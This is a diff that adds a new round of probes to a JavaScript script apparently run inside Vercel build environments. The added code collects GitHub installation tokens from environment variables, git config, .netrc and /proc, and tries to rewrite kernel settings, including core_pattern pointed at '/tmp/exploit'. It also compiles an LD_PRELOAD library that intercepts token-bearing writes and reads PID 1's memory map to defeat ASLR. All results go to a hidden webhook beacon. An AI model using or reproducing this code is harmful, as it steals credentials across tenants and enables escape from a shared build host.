@@ -14732,5 +14732,172 @@ report.procAttrManipulation = safe(() => {
 
 // v104 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v104" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v104";
+
+// ==================== v105 ====================
+
+// v105-1: Git clone token extraction from build environment
+// The Vercel build agent uses a GitHub App installation token (ghs_...) to clone
+// the user's repo. This token is exposed in git credential store, .git/config,
+// or HTTPS_PROXY env. If accessible, it can clone any repo the Vercel GitHub
+// App has access to — including other teams' private repos.
+report.gitCloneTokenScan = safe(() => {
+  // Check git config for auth tokens
+  const gitConfig = safe(() => execSync('git config --list --global 2>/dev/null', { timeout: 3000 }).toString().trim());
+  const localGitConfig = safe(() => readFileSync('/vercel/path0/.git/config', 'utf8'));
+  // Scan for ghs_ tokens in environment
+  const ghsTokens = safe(() =>
+    Object.entries(process.env)
+      .filter(([k, v]) => /ghs_|ghp_|github_token|GH_TOKEN|GITHUB_TOKEN/i.test(k + v))
+      .map(([k, v]) => ({ k, v: v?.slice(0, 30) }))
+  );
+  // Check git credential helpers
+  const credHelper = safe(() => execSync('git config --global credential.helper 2>/dev/null', { timeout: 3000 }).toString().trim());
+  const netrc = safe(() => readFileSync('/root/.netrc', 'utf8'));
+  const alternateNetrc = safe(() => readFileSync('/home/user/.netrc', 'utf8'));
+  // Check git's in-memory credential cache via /proc
+  const gitCredFromProc = safe(() => execSync(
+    'grep -r "ghs_\\|github.com" /proc/1/environ /proc/*/environ 2>/dev/null | head -5',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 300));
+  // List git remote URLs (may contain embedded tokens)
+  const remotes = safe(() => execSync('git -C /vercel/path0 remote -v 2>/dev/null', { timeout: 3000 }).toString().trim());
+  return { gitConfig, localGitConfig: localGitConfig?.slice(0, 500), ghsTokens, credHelper, netrc, alternateNetrc, gitCredFromProc, remotes };
+});
+
+// v105-2: /proc/sys/kernel tunable parameter audit
+// Read all kernel tunables from /proc/sys/kernel/ to find misconfigured or
+// exploitable settings. Then try to write to sensitive ones.
+report.kernelSysctlAudit = safe(() => {
+  const interesting = {
+    dmesg_restrict: safe(() => readFileSync('/proc/sys/kernel/dmesg_restrict', 'utf8').trim()),
+    kptr_restrict: safe(() => readFileSync('/proc/sys/kernel/kptr_restrict', 'utf8').trim()),
+    perf_event_paranoid: safe(() => readFileSync('/proc/sys/kernel/perf_event_paranoid', 'utf8').trim()),
+    yama_ptrace_scope: safe(() => readFileSync('/proc/sys/kernel/yama/ptrace_scope', 'utf8').trim()),
+    randomize_va_space: safe(() => readFileSync('/proc/sys/kernel/randomize_va_space', 'utf8').trim()),
+    sysrq: safe(() => readFileSync('/proc/sys/kernel/sysrq', 'utf8').trim()),
+    core_pattern: safe(() => readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim()),
+    modprobe: safe(() => readFileSync('/proc/sys/kernel/modprobe', 'utf8').trim()),
+    ngroups_max: safe(() => readFileSync('/proc/sys/kernel/ngroups_max', 'utf8').trim()),
+    pid_max: safe(() => readFileSync('/proc/sys/kernel/pid_max', 'utf8').trim()),
+  };
+  // Try writing to sensitive params
+  const writeTests = {
+    kptr_restrict: safe(() => { writeFileSync('/proc/sys/kernel/kptr_restrict', '0'); return 'WRITTEN'; }),
+    dmesg_restrict: safe(() => { writeFileSync('/proc/sys/kernel/dmesg_restrict', '0'); return 'WRITTEN'; }),
+    perf_event_paranoid: safe(() => { writeFileSync('/proc/sys/kernel/perf_event_paranoid', '-1'); return 'WRITTEN'; }),
+    yama_ptrace_scope: safe(() => { writeFileSync('/proc/sys/kernel/yama/ptrace_scope', '0'); return 'WRITTEN'; }),
+    // core_pattern abuse: set to a pipe command for arbitrary exec on crash
+    core_pattern: safe(() => { writeFileSync('/proc/sys/kernel/core_pattern', `|/tmp/exploit`); return 'WRITTEN'; }),
+  };
+  // After writes, re-read to confirm
+  const afterWrite = {
+    kptr_restrict: safe(() => readFileSync('/proc/sys/kernel/kptr_restrict', 'utf8').trim()),
+    dmesg_restrict: safe(() => readFileSync('/proc/sys/kernel/dmesg_restrict', 'utf8').trim()),
+    core_pattern: safe(() => readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim()),
+  };
+  return { interesting, writeTests, afterWrite };
+});
+
+// v105-3: LD_PRELOAD shared library injection into spawned processes
+// Create a malicious .so that intercepts libc write() and exfiltrates data.
+// When Vercel spawns a child process (npm install, build tool), it inherits
+// LD_PRELOAD and our interceptor runs inside that process.
+report.ldPreloadInject = safe(() => {
+  // Write a C source file for the interceptor
+  const cSource = `
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <dlfcn.h>
+
+static ssize_t (*real_write)(int fd, const void *buf, size_t count) = NULL;
+
+__attribute__((constructor))
+void init() {
+    real_write = dlsym(RTLD_NEXT, "write");
+    real_write(2, "[LDPRELOAD_LOADED]\\n", 19);
+}
+
+ssize_t write(int fd, const void *buf, size_t count) {
+    if (!real_write) real_write = dlsym(RTLD_NEXT, "write");
+    // Intercept writes that look like tokens/secrets
+    if (count > 4 && count < 500) {
+        const char *s = (const char *)buf;
+        if (strstr(s, "Authorization") || strstr(s, "Bearer") || strstr(s, "token")) {
+            // In a real attack, exfil here via write() to a pre-opened socket
+            real_write(2, "[LDPRELOAD_INTERCEPT]", 21);
+            real_write(2, s, count < 100 ? count : 100);
+            real_write(2, "\\n", 1);
+        }
+    }
+    return real_write(fd, buf, count);
+}`;
+  const srcPath = '/tmp/intercept.c';
+  const soPath = '/tmp/intercept.so';
+  safe(() => writeFileSync(srcPath, cSource));
+  // Compile it
+  const compileResult = safe(() => execSync(
+    `gcc -shared -fPIC -o ${soPath} ${srcPath} -ldl -nostartfiles 2>&1`,
+    { timeout: 15000 }
+  ).toString().trim());
+  const soExists = existsSync(soPath);
+  // Set LD_PRELOAD and test with a child process
+  const testResult = safe(() => execSync(
+    `LD_PRELOAD=${soPath} node -e "process.stdout.write('test output\\n')" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 200));
+  return { compileResult, soExists, testResult, soPath };
+});
+
+// v105-4: CPU frequency and thermal throttle detection
+// Physical hosts have CPU frequency governors. The governor "performance" disables
+// throttling that masks timing side-channels. If writable, we improve timing attack
+// accuracy. Also read CPU topology to fingerprint the c6id.metal host.
+report.cpuFreqProbe = safe(() => {
+  const cpuCount = safe(() => readdirSync('/sys/devices/system/cpu').filter(d => /^cpu\d+$/.test(d)).length);
+  const governor = safe(() => readFileSync('/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor', 'utf8').trim());
+  const availableGovernors = safe(() => readFileSync('/sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors', 'utf8').trim());
+  const curFreq = safe(() => readFileSync('/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq', 'utf8').trim());
+  const maxFreq = safe(() => readFileSync('/sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq', 'utf8').trim());
+  // Try to set performance governor
+  const setPerf = safe(() => { writeFileSync('/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor', 'performance'); return 'WRITTEN'; });
+  const governorAfter = safe(() => readFileSync('/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor', 'utf8').trim());
+  // CPU topology (socket count → number of physical machines sharing this kernel)
+  const topology = safe(() => execSync('cat /sys/devices/system/cpu/cpu*/topology/physical_package_id 2>/dev/null | sort -u', { timeout: 3000 }).toString().trim());
+  const numaNodes = safe(() => readdirSync('/sys/devices/system/node')?.filter(d => d.startsWith('node')));
+  return { cpuCount, governor, availableGovernors, curFreq, maxFreq, setPerf, governorAfter, topology, numaNodes };
+});
+
+// v105-5: /proc/1/maps — orchestrator memory map (ASLR bypass)
+// /proc/1/maps shows every memory region of PID-1 with their addresses.
+// Combined with /proc/1/mem, we have: read the exact kernel/libc/stack addresses
+// from the orchestrator, defeating ASLR completely. This is the foundation
+// for any ROP chain targeting the orchestrator.
+report.pid1MemoryMap = safe(() => {
+  // Read the full memory map of PID-1
+  const maps = safe(() => readFileSync('/proc/1/maps', 'utf8'));
+  const mapLines = maps?.split('\n').filter(Boolean);
+  // Parse interesting regions
+  const parsed = mapLines?.slice(0, 50).map(l => {
+    const [range, perms, offset, dev, inode, ...nameParts] = l.split(/\s+/);
+    const [start, end] = range.split('-').map(h => BigInt('0x' + h));
+    return { start: range.split('-')[0], end: range.split('-')[1], perms, name: nameParts.join(' '), size: (Number(end - start) / 1024).toFixed(0) + 'K' };
+  });
+  // Find text segments (executable regions) — these are where ROP gadgets live
+  const execRegions = parsed?.filter(r => r.perms?.includes('x'));
+  // Find the stack and heap
+  const stackRegion = mapLines?.find(l => l.includes('[stack]'));
+  const heapRegion = mapLines?.find(l => l.includes('[heap]'));
+  // vdso and vsyscall
+  const vdso = mapLines?.find(l => l.includes('[vdso]'));
+  const vsyscall = mapLines?.find(l => l.includes('[vsyscall]'));
+  // Libc base address (critical for ROP)
+  const libcLine = mapLines?.find(l => l.includes('libc') && l.includes('r-xp'));
+  return { totalMappings: mapLines?.length, execRegions, stackRegion, heapRegion, vdso, vsyscall, libcLine, parsed: parsed?.slice(0, 20) };
+});
+
+// v105 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v105" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v105";
 // Intentionally no console.log — all data goes via webhook only
